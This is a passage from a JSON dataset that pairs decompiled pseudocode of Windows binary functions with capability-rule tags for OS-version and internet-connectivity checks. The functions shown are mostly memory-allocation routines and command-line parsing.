            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t * fcn.00401370(void)\n\n{\n    int32_t **ppiVar1;\n    uint *puVar2;\n    int32_t *piVar3;\n    int32_t iVar4;\n    \n    if (*0x4635e4 == NULL) {\n        puVar2 = sub.kernel32.dll_LocalAlloc(0, 0x644);\n        if (puVar2 == NULL) {\n            return NULL;\n        }\n        *puVar2 = *0x4635e0;\n        iVar4 = 0;\n        *0x4635e0 = puVar2;\n        do {\n            ppiVar1 = puVar2 + iVar4 * 4 + 1;\n            *ppiVar1 = *0x4635e4;\n            iVar4 = iVar4 + 1;\n            *0x4635e4 = ppiVar1;\n        } while (iVar4 != 100);\n    }\n    piVar3 = *0x4635e4;\n    *0x4635e4 = **0x4635e4;\n    return piVar3;\n}\n",
        "token_count": 238
    },
    "00401480": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nulong __fastcall fcn.00401480(uint param_1, uint32_t *param_2)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    int32_t *in_EAX;\n    uint32_t uVar4;\n    uint uVar5;\n    int32_t *piVar6;\n    int32_t iStack20;\n    \n    piVar6 = in_EAX;\n    while( true ) {\n        uVar1 = *param_2;\n        uVar4 = piVar6[2];\n        if ((uVar4 <= uVar1) && (uVar1 + param_2[1] <= uVar4 + piVar6[3])) break;\n        piVar6 = *piVar6;\n        if (in_EAX == piVar6) {\n            uVar5 = 0;\ncode_r0x0040150c:\n            return CONCAT44(iStack20, uVar5);\n        }\n    }\n    if (uVar1 == uVar4) {\n        piVar6[2] = piVar6[2] + param_2[1];\n        uVar4 = param_2[1];\n        piVar6[3] = piVar6[3] - uVar4;\n        if (piVar6[3] == 0) {\n            uVar4 = fcn.004013f8();\n        }\n    }\n    else if (uVar1 + param_2[1] == uVar4 + piVar6[3]) {\n        piVar6[3] = piVar6[3] - param_2[1];\n    }\n    else {\n        uVar2 = *param_2;\n        uVar3 = param_2[1];\n        iStack20 = (piVar6[2] + piVar6[3]) - (uVar2 + uVar3);\n        piVar6[3] = uVar1 - uVar4;\n        uVar4 = fcn.004013c8(uVar2 + uVar3);\n        if (uVar4 == '\\0') {\n            uVar5 = 0;\n            goto code_r0x0040150c;\n        }\n    }\n    uVar5 = CONCAT31(uVar4 >> 8, 1);\n    goto code_r0x0040150c;\n}\n",
        "token_count": 511
    },
    "00401578": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00401578(int32_t *param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    \n    param_1[1] = 0x100000;\n    iVar2 = sub.kernel32.dll_VirtualAlloc();\n    *param_1 = iVar2;\n    if (iVar2 == 0) {\n        param_1[1] = param_2 + 0xffffU & 0xffff0000;\n        iVar2 = sub.kernel32.dll_VirtualAlloc();\n        *param_1 = iVar2;\n    }\n    if (*param_1 != 0) {\n        cVar1 = fcn.004013c8();\n        if (cVar1 == '\\0') {\n            sub.kernel32.dll_VirtualFree(*param_1, 0, 0x8000);\n            *param_1 = 0;\n        }\n    }\n    return;\n}\n",
        "token_count": 205
    },
    "004015f0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004015f0(uint32_t *param_1, int32_t param_2)\n\n{\n    uint *puVar1;\n    uint32_t uVar2;\n    uint32_t in_EAX;\n    int32_t iVar3;\n    uint *puVar4;\n    uint32_t uStack28;\n    uint32_t uStack24;\n    \n    uStack28 = 0xffffffff;\n    uStack24 = 0;\n    puVar1 = *0x4635e8;\n    while (puVar4 = puVar1,  puVar4 != 0x4635e8) {\n        puVar1 = *puVar4;\n        uVar2 = puVar4[2];\n        if ((in_EAX <= uVar2) && (uVar2 + puVar4[3] <= param_2 + in_EAX)) {\n            if (uVar2 < uStack28) {\n                uStack28 = uVar2;\n            }\n            if (uStack24 < uVar2 + puVar4[3]) {\n                uStack24 = uVar2 + puVar4[3];\n            }\n            iVar3 = sub.kernel32.dll_VirtualFree(uVar2, 0, 0x8000);\n            if (iVar3 == 0) {\n                *0x4635c4 = 1;\n            }\n            fcn.004013f8();\n        }\n    }\n    *param_1 = 0;\n    if (uStack24 != 0) {\n        *param_1 = uStack28;\n        param_1[1] = uStack24 - uStack28;\n    }\n    return;\n}\n",
        "token_count": 361
    },
    "004017bc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004017bc(uint param_1, int32_t *param_2)\n\n{\n    int32_t in_EAX;\n    uint *puVar1;\n    int32_t iStack24;\n    \n    puVar1 = *0x4635f8;\n    do {\n        for (; puVar1 != 0x4635f8; puVar1 = *puVar1) {\n            if ((in_EAX + 0x3fffU & 0xffffc000) <= puVar1[3]) {\n                fcn.004016a8();\n                if (*param_2 == 0) {\n                    return;\n                }\n                puVar1[2] = puVar1[2] + param_2[1];\n                puVar1[3] = puVar1[3] - param_2[1];\n                if (puVar1[3] != 0) {\n                    return;\n                }\n                fcn.004013f8();\n                return;\n            }\n        }\n        fcn.00401514();\n        if (*param_2 == 0) {\n            return;\n        }\n        fcn.00401410();\n        puVar1 = *0x4635f8;\n    } while (iStack24 != 0);\n    fcn.004015f0();\n    *param_2 = 0;\n    return;\n}\n",
        "token_count": 297
    },
    "0040184c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040184c(int32_t *param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint *puVar1;\n    uint32_t uVar2;\n    int32_t iStack32;\n    int32_t iStack24;\n    \n    uVar2 = param_2 + 0x3fffU & 0xffffc000;\n    puVar1 = *0x4635f8;\ncode_r0x00401872:\n    do {\n        for (; (puVar1 != 0x4635f8 && (in_EAX != puVar1[2])); puVar1 = *puVar1) {\n        }\n        if (in_EAX == puVar1[2]) {\n            if (uVar2 <= puVar1[3]) goto code_r0x0040191f;\n            fcn.00401578();\n            if (iStack32 != 0) {\n                fcn.00401410();\n                puVar1 = *0x4635f8;\n                if (iStack24 == 0) {\n                    fcn.004015f0();\n                    *param_1 = 0;\n                    return;\n                }\n                goto code_r0x00401872;\n            }\n        }\n        fcn.00401578();\n        if (iStack32 == 0) {\ncode_r0x0040191f:\n            if ((in_EAX != puVar1[2]) || (puVar1[3] < uVar2)) {\n                *param_1 = 0;\n                return;\n            }\n            fcn.004016a8();\n            if (*param_1 == 0) {\n                return;\n            }\n            puVar1[2] = puVar1[2] + param_1[1];\n            puVar1[3] = puVar1[3] - param_1[1];\n            if (puVar1[3] != 0) {\n                return;\n            }\n            fcn.004013f8();\n            return;\n        }\n        fcn.00401410();\n        puVar1 = *0x4635f8;\n        if (iStack24 == 0) {\n            fcn.004015f0();\n            *param_1 = 0;\n            return;\n        }\n    } while( true );\n}\n",
        "token_count": 508
    },
    "00401970": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00401970(uint *param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iStack28;\n    int32_t iStack20;\n    \n    if ((in_EAX + 0x3fffU & 0xffffc000) < (param_2 + in_EAX & 0xffffc000U)) {\n        fcn.0040173c();\n        fcn.00401410();\n        if (iStack28 != 0) {\n            fcn.004015f0();\n            iStack28 = iStack20;\n        }\n        if (iStack28 != 0) {\n            fcn.00401480();\n        }\n    }\n    else {\n        *param_1 = 0;\n    }\n    return;\n}\n",
        "token_count": 176
    },
    "004019fc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.004019fc(void)\n\n{\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uVar2;\n    uint uStack16;\n    uint uStack12;\n    uchar *puStack8;\n    \n    puStack8 = &stack0xfffffffc;\n    uStack12 = 0x401ab2;\n    uStack16 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack16;\n    sub.kernel32.dll_InitializeCriticalSection(0x4635c8);\n    if (*0x463049 != '\\0') {\n        sub.kernel32.dll_EnterCriticalSection(0x4635c8);\n    }\n    fcn.004013c0();\n    fcn.004013c0();\n    fcn.004013c0();\n    uVar2 = 0;\n    *0x463620 = sub.kernel32.dll_LocalAlloc(0, 0xff8);\n    if (*0x463620 != 0) {\n        iVar1 = 3;\n        do {\n            *(*0x463620 + -0xc + iVar1 * 4) = 0;\n            iVar1 = iVar1 + 1;\n        } while (iVar1 != 0x401);\n        *0x46360c = 0x463608;\n        *0x463608 = 0x463608;\n        *0x463614 = 0x463608;\n        *0x4635c0 = 1;\n    }\n    *in_FS_OFFSET = uVar2;\n    if (*0x463049 != '\\0') {\n        sub.kernel32.dll_LeaveCriticalSection(0x4635c8, 0x401ab9);\n    }\n    return;\n}\n",
        "token_count": 366
    },
    "00401ac0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00401ac0(void)\n\n{\n    uchar *puVar1;\n    uint *puVar2;\n    uint *in_FS_OFFSET;\n    uint *puVar3;\n    uint uStack20;\n    uint uStack16;\n    uchar *puStack12;\n    \n    puStack12 = &stack0xfffffffc;\n    if (*0x4635c0 == '\\0') {\n        return;\n    }\n    uStack16 = 0x401b96;\n    uStack20 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffec;\n    puVar1 = &stack0xfffffffc;\n    if (*0x463049 != '\\0') {\n        sub.kernel32.dll_EnterCriticalSection(0x4635c8);\n        puVar1 = puStack12;\n    }\n    puStack12 = puVar1;\n    *0x4635c0 = 0;\n    puVar3 = *0x463620;\n    sub.kernel32.dll_LocalFree();\n    *0x463620 = NULL;\n    for (puVar2 = *0x4635e8; puVar2 != 0x4635e8; puVar2 = *puVar2) {\n        puVar3 = puVar2[2];\n        sub.kernel32.dll_VirtualFree();\n    }\n    fcn.004013c0();\n    fcn.004013c0();\n    fcn.004013c0();\n    while (puVar2 = *0x4635e0,  puVar2 != NULL) {\n        *0x4635e0 = *puVar2;\n        sub.kernel32.dll_LocalFree();\n        puVar3 = puVar2;\n    }\n    *0x4635e0 = puVar2;\n    *in_FS_OFFSET = puVar3;\n    uStack20 = 0x401b9d;\n    if (*0x463049 != '\\0') {\n        sub.kernel32.dll_LeaveCriticalSection(0x4635c8);\n    }\n    sub.kernel32.dll_DeleteCriticalSection(0x4635c8);\n    return;\n}\n",
        "token_count": 449
    },
    "00401e90": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00401e90(void)\n\n{\n    if (0 < *0x463618) {\n        if (*0x463618 < 0xc) {\n            *0x4635c4 = 7;\n        }\n        else {\n            **0x46361c = *0x463618 | 2;\n            fcn.00401c64();\n            *0x46361c = NULL;\n            *0x463618 = 0;\n        }\n    }\n    return;\n}\n",
        "token_count": 108
    },
    "00401f68": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nulong fcn.00401f68(void)\n\n{\n    uint uVar1;\n    int32_t iStack12;\n    uint uStack8;\n    \n    fcn.004017bc();\n    if (iStack12 != 0) {\n        uVar1 = fcn.00401edc();\n        if (uVar1 != '\\0') {\n            uVar1 = CONCAT31(uVar1 >> 8, 1);\n            goto code_r0x00401f8f;\n        }\n    }\n    uVar1 = 0;\ncode_r0x00401f8f:\n    return CONCAT44(uStack8, uVar1);\n}\n",
        "token_count": 140
    },
    "00401f94": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nulong fcn.00401f94(void)\n\n{\n    uint uVar1;\n    int32_t iStack16;\n    uint uStack12;\n    \n    fcn.0040184c();\n    if (iStack16 != 0) {\n        uVar1 = fcn.00401edc();\n        if (uVar1 != '\\0') {\n            uVar1 = CONCAT31(uVar1 >> 8, 1);\n            goto code_r0x00401fc0;\n        }\n    }\n    uVar1 = 0;\ncode_r0x00401fc0:\n    return CONCAT44(uStack12, uVar1);\n}\n",
        "token_count": 139
    },
    "004020e8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint32_t * fcn.004020e8(void)\n\n{\n    uint32_t *puVar1;\n    char cVar2;\n    int32_t in_EAX;\n    uint32_t uVar3;\n    uint32_t *puVar4;\n    uint32_t uVar5;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    if (*0x4635c0 == '\\0') {\n        puStack28 = 0x402101;\n        cVar2 = fcn.004019fc();\n        if (cVar2 == '\\0') {\n            return NULL;\n        }\n    }\n    if (0x7ffffff8 < in_EAX) {\n        return NULL;\n    }\n    uStack32 = 0x402264;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    puStack28 = &stack0xfffffffc;\n    if (*0x463049 != '\\0') {\n        uStack40 = 0x4635c8;\n        puStack28 = &stack0xfffffffc;\n        sub.kernel32.dll_EnterCriticalSection();\n    }\n    puVar4 = *0x46361c;\n    uVar5 = in_EAX + 7U & 0xfffffffc;\n    if (uVar5 < 0xc) {\n        uVar5 = 0xc;\n    }\n    if (uVar5 < 0x1001) {\n        uVar3 = uVar5;\n        if (uVar5 < 0) {\n            uVar3 = uVar5 + 3;\n        }\n        puVar1 = *(*0x463620 + -0xc + (uVar3 >> 2) * 4);\n        if (puVar1 != NULL) {\n            *(puVar1 + uVar5) = *(puVar1 + uVar5) & 0xfffffffe;\n            puVar4 = puVar1[1];\n            if (puVar1 == puVar4) {\n                uVar3 = uVar5;\n                if (uVar5 < 0) {\n                    uVar3 = uVar5 + 3;\n                }\n                *(*0x463620 + -0xc + (uVar3 >> 2) * 4) = 0;\n            }\n            else {\n                uVar3 = uVar5;\n                if (uVar5 < 0) {\n                    uVar3 = uVar5 + 3;\n                }\n                *(*0x463620 + -0xc + (uVar3 >> 2) * 4) = puVar4;\n                uVar3 = *puVar1;\n                *(uVar3 + 4) = puVar4;\n                *puVar4 = uVar3;\n            }\n            *puVar1 = puVar1[2] | 2;\n            *0x4635b0 = *0x4635b0 + 1;\n            *0x4635b4 = *0x4635b4 + (uVar5 - 4);\n            fcn.00403a90();\n            return puVar1 + 1;\n        }\n    }\n    if (*0x463618 < uVar5) {\n        fcn.00401ff4();\n        puVar4 = NULL;\n        *in_FS_OFFSET = uStack40;\n        uStack32 = 0x40226b;\n        if (*0x463049 != '\\0') {\n            uStack36 = 0x4635c8;\n            puVar4 = sub.kernel32.dll_LeaveCriticalSection();\n        }\n        return puVar4;\n    }\n    *0x463618 = *0x463618 - uVar5;\n    if (*0x463618 < 0xc) {\n        uVar5 = uVar5 + *0x463618;\n        *0x463618 = 0;\n    }\n    *0x46361c = *0x46361c + uVar5;\n    *puVar4 = uVar5 | 2;\n    *0x4635b0 = *0x4635b0 + 1;\n    *0x4635b4 = *0x4635b4 + (uVar5 - 4);\n    fcn.00403a90();\n    return puVar4 + 1;\n}\n",
        "token_count": 962
    },
    "004025f8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint fcn.004025f8(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    if (*0x4635c0 == '\\0') {\n        puStack24 = 0x402611;\n        cVar1 = fcn.004019fc();\n        if (cVar1 == '\\0') {\n            return 0;\n        }\n    }\n    uStack28 = 0x4026a9;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    puStack24 = &stack0xfffffffc;\n    if (*0x463049 != '\\0') {\n        uStack36 = 0x4635c8;\n        puStack24 = &stack0xfffffffc;\n        sub.kernel32.dll_EnterCriticalSection();\n    }\n    cVar1 = fcn.0040241c();\n    if ((cVar1 == '\\0') && (iVar2 = fcn.004020e8(),  iVar2 != 0)) {\n        fcn.004028b8();\n        fcn.00402278();\n    }\n    uVar3 = 0;\n    *in_FS_OFFSET = uStack36;\n    uStack28 = 0x4026b0;\n    if (*0x463049 != '\\0') {\n        uStack32 = 0x4635c8;\n        uVar3 = sub.kernel32.dll_LeaveCriticalSection();\n    }\n    return uVar3;\n}\n",
        "token_count": 362
    },
    "00402818": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00402818(void)\n\n{\n    uint8_t in_AL;\n    \n    if (*0x463008 != NULL) {\n        (**0x463008)();\n    }\n    if ((in_AL & 0x7f) == 0) {\n        fcn.00405d78();\n    }\n    fcn.004027c0();\n    return;\n}\n",
        "token_count": 80
    },
    "0040274c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint fcn.0040274c(void)\n\n{\n    int32_t *piVar1;\n    \n    piVar1 = fcn.00405d78();\n    if (*piVar1 != 0) {\n        piVar1 = fcn.00405d78();\n        return *(*piVar1 + 8);\n    }\n    return 0;\n}\n",
        "token_count": 77
    },
    "0040276c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint fcn.0040276c(void)\n\n{\n    int32_t *piVar1;\n    \n    piVar1 = fcn.00405d78();\n    if (*piVar1 != 0) {\n        piVar1 = fcn.00405d78();\n        return *(*piVar1 + 4);\n    }\n    return 0;\n}\n",
        "token_count": 77
    },
    "00402824": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x004027f9)\n// WARNING: Removing unreachable block (ram,0x004027fe)\n\nvoid __fastcall fcn.00402824(uint param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00405d78(param_1, param_2);\n    if (*(iVar1 + 4) != 0) {\n        if (*0x463008 != NULL) {\n            (**0x463008)();\n        }\n        fcn.00405d78();\n        fcn.004027c0();\n        return;\n    }\n    return;\n}\n",
        "token_count": 140
    },
    "004028f8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint8_t * __fastcall fcn.004028f8(uint param_1, int32_t *param_2)\n\n{\n    int32_t iVar1;\n    uint8_t *in_EAX;\n    uint8_t *puVar2;\n    uint8_t *puVar3;\n    uint8_t *puVar4;\n    int32_t iVar5;\n    \n    while( true ) {\n        while ((*in_EAX != 0 && (*in_EAX < 0x21))) {\n            in_EAX = sub.user32.dll_CharNextA();\n        }\n        puVar4 = in_EAX;\n        if ((*in_EAX != 0x22) || (in_EAX[1] != 0x22)) break;\n        in_EAX = in_EAX + 2;\n    }\n    while (0x20 < *puVar4) {\n        if (*puVar4 == 0x22) {\n            puVar2 = sub.user32.dll_CharNextA(puVar4);\n            puVar3 = puVar4;\n            for (; (*puVar2 != 0 && (*puVar2 != 0x22)); puVar2 = sub.user32.dll_CharNextA(puVar3, puVar2)) {\n            }\n            puVar4 = puVar2;\n            if (*puVar2 != 0) {\n                puVar4 = sub.user32.dll_CharNextA(puVar3, puVar2);\n            }\n        }\n        else {\n            puVar4 = sub.user32.dll_CharNextA();\n        }\n    }\n    fcn.004045f4();\n    iVar1 = *param_2;\n    iVar5 = 0;\n    while (0x20 < *in_EAX) {\n        if (*in_EAX == 0x22) {\n            puVar4 = in_EAX;\n            in_EAX = sub.user32.dll_CharNextA(in_EAX);\n            while ((*in_EAX != 0 && (*in_EAX != 0x22))) {\n                puVar3 = sub.user32.dll_CharNextA(puVar4, in_EAX);\n                for (; in_EAX < puVar3; in_EAX = in_EAX + 1) {\n                    *(iVar1 + iVar5) = *in_EAX;\n                    iVar5 = iVar5 + 1;\n                }\n            }\n            if (*in_EAX != 0) {\n                in_EAX = sub.user32.dll_CharNextA(puVar4, in_EAX);\n            }\n        }\n        else {\n            puVar4 = sub.user32.dll_CharNextA();\n            for (; in_EAX < puVar4; in_EAX = in_EAX + 1) {\n                *(iVar1 + iVar5) = *in_EAX;\n                iVar5 = iVar5 + 1;\n            }\n        }\n    }\n    return in_EAX;\n}\n",
        "token_count": 614
    },
    "004029e4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004029e4(uint param_1, int32_t *param_2)\n\n{\n    int32_t in_EAX;\n    uchar auStack276 [264];\n    \n    fcn.00403fa8();\n    if (in_EAX == 0) {\n        sub.kernel32.dll_GetModuleFileNameA(0, auStack276, 0x105);\n        fcn.00404098();\n    }\n    else {\n        sub.kernel32.dll_GetCommandLineA();\n        while( true ) {\n            fcn.004028f8();\n            if ((in_EAX == 0) || (*param_2 == 0)) break;\n            in_EAX = in_EAX + -1;\n        }\n    }\n    return;\n}\n",
        "token_count": 161
    },
    "0040330c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
